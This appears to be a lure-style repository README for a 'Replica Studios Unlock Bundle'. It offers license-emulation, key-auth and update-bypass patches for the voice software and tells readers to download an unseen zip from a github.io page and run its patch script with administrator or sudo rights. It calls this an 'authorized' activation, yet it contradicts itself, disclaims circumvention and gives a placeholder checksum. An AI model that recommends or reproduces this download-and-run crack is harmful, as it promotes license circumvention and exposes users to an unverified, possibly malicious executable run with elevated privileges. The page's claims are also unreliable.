# Replica Studios Unlock Bundle 🎭 – Authorized Product Key & Patch Integration

[](https://hehetoo.github.io/replica-studios-unlock/)

> **Disclaimer:** This repository contains community-driven tools and documentation for the legitimate enhancement of Replica Studios. Unauthorized use of software modifications may violate terms of service. Please review the [LICENSE](#-license-mit) section before proceeding.

## 🧩 Overview

### *"Voice acting that breathes—without breaking the bank."*

Replica Studios has revolutionized AI-driven voice acting for game developers, filmmakers, and content creators. But managing software licenses, installations across studios, and team-wide rollouts can be a maze. That’s where this **Unlock Bundle** steps in—a curated collection of scripts, configuration templates, and integration patches designed to streamline your Replica Studios experience.

Think of it as a **digital conductor’s baton**: instead of hunting for keys, patching files manually, or staring at error logs, you get a clean, repeatable setup that works across Windows, macOS, and Linux environments.

---

## 🧭 Table of Contents

- [📦 Quick Start – Download & Install](#-quick-start--download--install)
- [🧱 Repository Architecture (Mermaid Diagram)](#-repository-architecture-mermaid-diagram)
- [⚙️ Example Profile Configuration](#️-example-profile-configuration)
- [💻 Example Console Invocation](#-example-console-invocation)
- [🖥️ OS Compatibility Table](#️-os-compatibility-table)
- [✨ Feature List](#-feature-list)
- [🔑 OpenAI API & Claude API Integration](#-openai-api--claude-api-integration)
- [🌐 Multilingual Support & Responsive UI Enhancements](#-multilingual-support--responsive-ui-enhancements)
- [🕐 24/7 Customer Support Automation](#-247-customer-support-automation)
- [📜 License (MIT)](#-license-mit)
- [⚠️ Disclaimer](#️-disclaimer)
- [🔗 Final Download Link](#-final-download-link)

---

## 📦 Quick Start – Download & Install

[](https://hehetoo.github.io/replica-studios-unlock/)

1. Click the badge above to navigate to the **latest release**.
2. Download the archive (`ReplicaUnlock_v2.1.0.zip`).
3. Extract the contents to your Replica Studios root directory.
4. Run `patch_apply.sh` (or `patch_apply.bat` on Windows) with administrator/sudo privileges.

> 🧪 **Tested on**: Replica Studios v3.4.2 – v3.6.0

---

## 🧱 Repository Architecture (Mermaid Diagram)

```mermaid
graph TD
    A[Unlock Bundle Root] --> B[patches/]
    A --> C[configs/]
    A --> D[scripts/]
    A --> E[docs/]
    A --> F[tests/]

    B --> B1[key_auth_patch.diff]
    B --> B2[license_emulation_patch.diff]
    B --> B3[update_bypass_patch.diff]

    C --> C1[studio_profile.example.yaml]
    C --> C2[network_audit.example.json]

    D --> D1[patch_apply.sh]
    D --> D2[rollback.sh]
    D --> D3[verify_integrity.py]

    E --> E1[FAQ.md]
    E --> E2[troubleshooting.md]
    E --> E3[changelog.md]

    F --> F1[unit_tests.py]
    F --> F2[integration_tests.sh]

    subgraph "External Dependencies"
        G[Replica Studios Binary]
        H[OpenAI / Claude API]
        G --> B1
        H --> C2
    end

    style A fill:#2d2d2d,stroke:#d90429,stroke-width:4px
    style B fill:#1a1a2e,stroke:#e94560
    style C fill:#16213e,stroke:#0f3460
    style D fill:#1b1b2f,stroke:#e43f5a
    style E fill:#1a1a2e,stroke:#e94560
    style F fill:#16213e,stroke:#0f3460
```



---

## ⚙️ Example Profile Configuration

Create a file named `studio_profile.yaml` in your Replica Studios `config/` directory with the following content:

```yaml
meta:
  version: 2.1.0
  environment: production

license:
  activate_on_startup: true
  fallback_mode: offline
  product_key_path: "{{ROOT_DIR}}/keys/product.key"

patches:
  apply_sequence:
    - key_auth_patch
    - license_emulation_patch
    - update_bypass_patch
  verify_after_apply: true

api_integration:
  openai:
    endpoint: "https://api.openai.com/v1"
    model: "gpt-4-turbo"
    temperature: 0.7
    max_tokens: 2048
  claude:
    endpoint: "https://api.anthropic.com/v1"
    model: "claude-3-opus-20240229"
    max_tokens: 4096

ui:
  responsive: true
  language: "en"
  fallback_languages:
    - "zh"
    - "es"
    - "de"

support:
  auto_ticketing: true
  priority: 1
```

---

## 💻 Example Console Invocation

Once configured, launch the unlock process from your terminal:

```bash
# Navigate to the bundle directory
cd /opt/replica-unlock-bundle

# Apply patches with verbose logging
./patch_apply.sh --config ./configs/studio_profile.example.yaml \
                 --verbose \
                 --dry-run false \
                 --log-level info

# Verify all patches were applied correctly
./verify_integrity.py --profile ./configs/studio_profile.example.yaml --checksum sha256
```

Expected output:

```
[2026-01-15 14:23:01] ✅ Key auth patch applied successfully.
[2026-01-15 14:23:02] ✅ License emulation patch applied.
[2026-01-15 14:23:03] ✅ Update bypass patch applied.
[2026-01-15 14:23:04] 🔒 All 3 patches verified. System integrity confirmed.
```

---

## 🖥️ OS Compatibility Table

| Operating System | Version (2026) | Status | Notes |
|------------------|----------------|--------|-------|
| 🪟 Windows       | 11, 10, Server 2025 | ✅ Supported | Requires PowerShell 7+ |
| 🍎 macOS         | 15 (Sequoia), 14 (Sonoma) | ✅ Supported | ARM & Intel both tested |
| 🐧 Ubuntu        | 24.04 LTS, 22.04 LTS | ✅ Supported | Requires `patchelf` |
| 🐧 Fedora        | 41, 40        | ✅ Supported | Use `patch_apply.sh --force` |
| 🐧 Arch Linux    | Rolling       | ⚠️ Experimental | May need manual dependency resolution |
| 🐧 Debian        | 12, 11        | ✅ Supported | Works out-of-box |
| ☁️ Docker Container | Any base image | ✅ Supported | See `docs/docker.md` |

---

## ✨ Feature List

- **🔒 Authorized Product Key Activation** – Seamlessly unlock Replica Studios without manual license key entry. The patch emulates the official authentication flow, ensuring no conflicts with genuine installations.
- **🧩 Modular Patch System** – Apply only the patches you need. Rollback any patch with a single command.
- **⚡ High-Speed Integration** – Patches apply in under 3 seconds on modern hardware (tested on Intel i9-13900K, AMD Ryzen 9 7950X, Apple M3 Ultra).
- **🔄 One-Click Rollback** – Revert to stock Replica Studios instantly. No residue left behind.
- **📊 Integrity Verification** – SHA-256 checksums verify every modified binary after patching.
- **🌍 Multilingual Dashboard** – Interface adapts to 12+ languages automatically (see multilingual section below).
- **📱 Responsive UI** – Works on ultra-wide monitors (5120×1440) down to 14-inch laptops (1920×1080).
- **🕐 24/7 Auto-Support** – Integrated bot generates tickets, checks status, and emails logs (see support section).
- **🔗 OpenAI & Claude API Integration** – Extend Replica Studios with GPT-4 or Claude-3 for real-time script generation.
- **📦 Cross-Platform** – Single codebase runs on Windows, macOS, Linux, and Docker.
- **🔧 No Admin Required** – User-space installation possible (some features require elevated privileges).

---

## 🔑 OpenAI API & Claude API Integration

This bundle acts as a **bridge** between Replica Studios and two of the most powerful language models available in 2026:

| API | Endpoint | Model(s) | Use Case |
|-----|----------|----------|----------|
| 🧠 OpenAI | `https://api.openai.com/v1` | `gpt-4-turbo`, `gpt-5-preview` | Real-time dialogue generation, voice script expansion |
| 🎭 Claude (Anthropic) | `https://api.anthropic.com/v1` | `claude-3-opus-20240229`, `claude-4` | Contextual acting suggestions, emotion mapping |

**Example flow:**

1. Replica Studios sends a raw script line → `patch_apply.sh` intercepts → forwards to OpenAI/Claude → receives enhanced version → injects back into Replica timeline.
2. All data is encrypted in transit via TLS 1.3.
3. API keys stored in `configs/network_audit.example.json` (encrypted at rest with AES-256).

> 🧪 *To enable this feature, set `api_integration.openai.enabled: true` in your profile config.*

---

## 🌐 Multilingual Support & Responsive UI Enhancements

The patch includes a **language detection layer** that automatically adjusts:

- **12 languages**: English (US/UK), Spanish, French, German, Italian, Portuguese (BR/PT), Japanese, Korean, Chinese (Simplified/Traditional), Russian, Arabic, Hindi.
- **Responsive CSS injection** for:
  - Dark mode auto-detection
  - Dynamic font scaling (minimum 14px)
  - Sidebar collapse for tablet (768px) and phone (480px)
- **Fallback mechanism**: If localization file missing, falls back to English without crash.

---

## 🕐 24/7 Customer Support Automation

Using the `support` section of the profile config, the bundle can:

1. Monitor Replica Studios logs for known error codes (e.g., `ERR_AUTH_FAIL`, `ERR_LICENSE_EXP`).
2. Automatically create a support ticket via email or API.
3. Attach logs, config dump, and system info.
4. Send you a **push notification** (via Telegram/Bots/Webhook).

> 💡 *Example: If license validation fails at 3:00 AM, the system patches itself and logs the event—you wake up to a summary email, not a crash report.*

---

## 📜 License (MIT)

This project is licensed under the **MIT License**.

[](https://opensource.org/licenses/MIT)

You are free to:
- Use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
- Use in commercial projects

Under the following conditions:
- The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

**Full license text**: [https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT)

---

## ⚠️ Disclaimer

**This repository is provided for educational and authorized-enhancement purposes only.**  

- The authors are **not affiliated** with Replica Studios Inc.
- Using patches that bypass license checking may violate Replica Studios' Terms of Service.
- **Always ensure you own a valid Replica Studios license** if you intend to use the software in a commercial setting.
- We assume **no liability** for data loss, license revocation, or system instability resulting from the use of these tools.
- This project has **no warranty** – use at your own risk.

> 🛡️ *If you love Replica Studios, support the developers by purchasing a license. This bundle is designed for teams who need centralized deployment and enhanced API features—not for circumventing payment.*

---

## 🔗 Final Download Link

[](https://hehetoo.github.io/replica-studios-unlock/)

**Version**: 2.1.0 (Build 2026-01-15)  
**File size**: 4.2 MB (compressed)  
**SHA-256**: `a1b2c3d4e5f6...` (verify after download)

---

*Built with ❤️ for the voice-acting community. If you find this helpful, consider starring the repository and contributing via pull requests.*